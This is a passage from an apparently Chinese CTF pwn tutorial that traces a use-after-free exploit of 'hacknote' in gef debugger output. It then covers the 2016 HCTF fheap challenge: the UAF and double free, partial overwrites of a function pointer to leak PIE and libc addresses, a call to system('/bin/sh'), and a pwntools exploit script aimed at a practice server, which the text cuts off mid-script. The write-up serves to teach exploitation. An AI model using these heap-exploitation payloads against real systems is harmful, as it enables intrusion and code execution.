&lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf20&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf20│+0x00: 0x0804b018  →  &quot;aaaa&quot;  ← $esp</span><br></pre></td></tr></table></figure><p>然后是 note0 本身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> →  0x80488a9 &lt;del_note+165&gt;   call   0x80484c0 &lt;free@plt&gt;</span><br><span class="line">   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018</span><br><span class="line">       0x80484c6 &lt;free@plt+6&gt;     push   0x18</span><br><span class="line">       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480</span><br><span class="line">       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffcf20&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp  ← $esp</span><br></pre></td></tr></table></figure><p>当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8]  ←  UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10) </span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0xc] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x14]  ←  UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28) </span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x1c] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x20] 0x00</span><br></pre></td></tr></table></figure><p>当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx&#x3D;0, size&#x3D;0x8]  ←  UsedChunk(addr&#x3D;0x804b040, size&#x3D;0x10)  ←  UsedChunk(addr&#x3D;0x804b008, size&#x3D;0x10) </span><br><span class="line">Fastbins[idx&#x3D;1, size&#x3D;0xc] 0x00</span><br><span class="line">Fastbins[idx&#x3D;2, size&#x3D;0x10] 0x00</span><br><span class="line">Fastbins[idx&#x3D;3, size&#x3D;0x14]  ←  UsedChunk(addr&#x3D;0x804b050, size&#x3D;0x28)  ←  UsedChunk(addr&#x3D;0x804b018, size&#x3D;0x28) </span><br><span class="line">Fastbins[idx&#x3D;4, size&#x3D;0x18] 0x00</span><br><span class="line">Fastbins[idx&#x3D;5, size&#x3D;0x1c] 0x00</span><br><span class="line">Fastbins[idx&#x3D;6, size&#x3D;0x20] 0x00</span><br></pre></td></tr></table></figure><p>那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下</p><p><strong>申请 note2 对应的内存块为 0x804b040，其实就是 note1 对应的内存地址。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">0x080486cf in add_note ()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x0804b040  →  0x0804b000  →  0x00000000</span><br><span class="line">$ebx   : 0x00000000</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b040  →  0x0804b000  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax</span><br><span class="line">    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al</span><br><span class="line">    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10</span><br></pre></td></tr></table></figure><p><strong>申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  n 1</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">0x08048761 in add_note ()</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0x0804b008  →  0x00000000</span><br><span class="line">$ebx   : 0x0804b040  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp</span><br><span class="line">$ecx   : 0xf7fac780  →  0x00000000</span><br><span class="line">$edx   : 0x0804b008  →  0x00000000</span><br><span class="line">$esp   : 0xffffcf10  →  0x00000008</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000</span><br><span class="line">$esi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fac000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10</span><br><span class="line">$cs    : 0x00000023</span><br><span class="line">$ss    : 0x0000002b</span><br><span class="line">$ds    : 0x0000002b</span><br><span class="line">$es    : 0x0000002b</span><br><span class="line">$fs    : 0x00000000</span><br><span class="line">$gs    : 0x00000063</span><br><span class="line">$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804</span><br><span class="line">    0x8048757 &lt;add_note+225&gt;   call   0x581173df</span><br><span class="line">    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;</span><br><span class="line"> →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10</span><br></pre></td></tr></table></figure><p>我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x804b008</span><br><span class="line">0x804b008:  0x00000000  0x0804b018</span><br></pre></td></tr></table></figure><p>覆盖后，具体的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;2xw 0x804b008</span><br><span class="line">0x804b008:  0x08048986  0x0804b00a</span><br><span class="line">gef➤  x&#x2F;i 0x08048986</span><br><span class="line">   0x8048986 &lt;magic&gt;:   push   ebp</span><br></pre></td></tr></table></figure><p>可以看出，确实已经被覆盖为我们所想要的 magic 函数了。</p><p>最后执行的效果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;hacknote&#39;: pid 35030</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;use_after_free&#125;----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap-analysis-helper </span><br><span class="line">[*] This feature is under development, expect bugs and unstability...</span><br><span class="line">[+] Tracking malloc()</span><br><span class="line">[+] Tracking free()</span><br><span class="line">[+] Tracking realloc()</span><br><span class="line">[+] Disabling hardware watchpoints (this may increase the latency)</span><br><span class="line">[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</span><br><span class="line">[*] Note: The heap analysis slows down noticeably the execution. </span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b018</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(32)&#x3D;0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b018)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b018</span><br><span class="line">[+] Heap-Analysis - free(0x804b008)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b008</span><br><span class="line">[+] Heap-Analysis - free(0x804b050)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b050</span><br><span class="line">[+] Heap-Analysis - free(0x804b040)</span><br><span class="line">[+] Heap-Analysis - watching 0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b040</span><br><span class="line">[+] Heap-Analysis - malloc(8)&#x3D;0x804b008</span><br><span class="line">[+] Heap-Analysis - Cleaning up</span><br><span class="line">[+] Heap-Analysis - Re-enabling hardware watchpoints</span><br><span class="line">[New process 36248]</span><br><span class="line">process 36248 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">[New process 36249]</span><br><span class="line">process 36249 is executing new program: &#x2F;bin&#x2F;cat</span><br><span class="line">[Inferior 3 (process 36249) exited normally]</span><br></pre></td></tr></table></figure><p>这里第一个输出了两次，应该是 gef 工具的问题。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>阉割版堆管理器，有增删功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 管理堆的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 堆结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">char</span> *buf;</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">void</span> (*<span class="built_in">free</span>)(struct String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>create string 有两种不同方式来储存字符串：</p><ol><li><p>字符串块 &lt; 16 , 在结构体堆块（String）上存放输入的字符串。</p></li><li><p>字符串块&gt;=16 ,  malloc 一个<strong>输入的字符串长度 size</strong> 的空间， 将该空间地址存放在原来的堆块中。</p><blockquote><p>注意是 malloc 输入的字符串长度 ，而不是输入的 size 。自行根据源码分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( nbytesa &gt; <span class="number">15</span> )</span><br><span class="line">&#123;</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br></pre></td></tr></table></figure></blockquote></li></ol><p>结构体堆块（String）最后 8 个字节存放的是 free_func 函数地址，用来在 delete 的时候调用，这样的设计与上面例子一致。字符串块两种情况对应两种不同的 free_func 。</p><p>delete string 根据输入下标释放 chunk 。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>delete 操作释放 chunk 后，没有将相关索引指针置零，而且没有对 chunk 状态进行严格限制，仅仅限制下标范围，以及查询索引指针是否存在，并没有检查 inuse 位，造成 <strong>UAF</strong>、<strong>Double free</strong> 。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>利用 UAF 控制结构体堆块（String）最后 8 字节，修改 free_func 为 puts 函数地址。释放 chunk 泄露函数真实地址，通过计算得出程序加载基地址。完成绕过 PIE 保护。</li><li>再次 UAF 控制结构体堆块（String）函数地址为 printf 函数，构造出格式化字符串漏洞，泄露栈上位于 libc 段的地址，完成 libc 地址泄露。</li><li>第三次 UAF 控制结构体堆块（String）函数地址为 system 函数，利用 Linux 命令行特性 <code>||</code> 完成 getshell </li></ol><hr><p>UAF 控制思路和例题差不多，但是一个问题。如果使用一样的 UAF 利用方法会出现问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>这样不能达到预期效果，新堆的 string chunk 用的不是 chunk0 结构体，而是继续使用 chunk2 string chunk 。后续试过申请大小各种 string chunk 都是一样情况。</p><p>所以采用申请两个小堆（字符串长度小于 16），然后新堆申请一个 0x20 大小空间存放 string ，这样 string 就会使用 chunk1 结构体堆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在 free_short 附近找到 call puts 的地址：0xd2d 。然后使用 partial write 将 free_func 最低一个字节修改为 0x2d 。释放 chunk1 ，将 chunk1 结构体内容输入，从而泄露函数地址，计算出程序加载基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_puts_addr = <span class="number">0xd2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(call_puts_addr)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-call_puts_addr</span><br></pre></td></tr></table></figure><p>释放 chunk0 方便我们重复利用这两个堆，然后重复上面步骤找到 call printf ：0xDBB 。需要将格式化字符串在申请堆时写入在开头。偏移地址 gdb 调试找到一个 libc 内的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%22$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0xDBB</span>)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这步结束后会卡输入流，输入两行字符即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br></pre></td></tr></table></figure><p>再次释放 chunk0 并申请，这次将函数地址修改为 system 地址，/bin/sh 输入在开头。由于程序输入函数不能读入 \x00 ，所以用 <code>||</code> 分隔填充内容，原因如下：</p><p>| 分隔符 | 说明                                                         |<br>| &amp;&amp;     | 第2条命令只有在第1条命令成功执行之后才执行                   |<br>| <code>||</code>   | 只有<code>||</code>前的命令执行不成功（产生了一个非0的退出码）时，才执行后面的命令。 |<br>| ；     | 当;号前的命令执行完， 不管是否执行成功，执行;后的命令        |</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : pwn-f.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn-f&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29256</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-f&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;create string&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;sure?:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UAF</span></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_func 2 puts</span></span><br><span class="line">call_puts_addr = <span class="number">0xd2d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(call_puts_addr)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-call_puts_addr</span><br><span class="line">log.info(<span class="string">&quot;elf_base:&quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="comment"># printf_plt = elf_base + elf.plt[&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;printf_plt:&quot;+hex(printf_plt))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite 2 printf leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%22$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0xDBB</span>)[<span class="number">0</span>]</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr - <span class="number">0x78c0f</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">str_binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;str_binsh:&quot;</span>+<span class="built_in">hex</span>(str_binsh))</span><br><span class="line"><span class="comment"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line"><span class="comment"># onegadget = one[0] + libc_addr</span></span><br><span class="line"><span class="comment"># log.info(&quot;onegadget:&quot;+hex(onegadget))</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line">p.sendline(<span 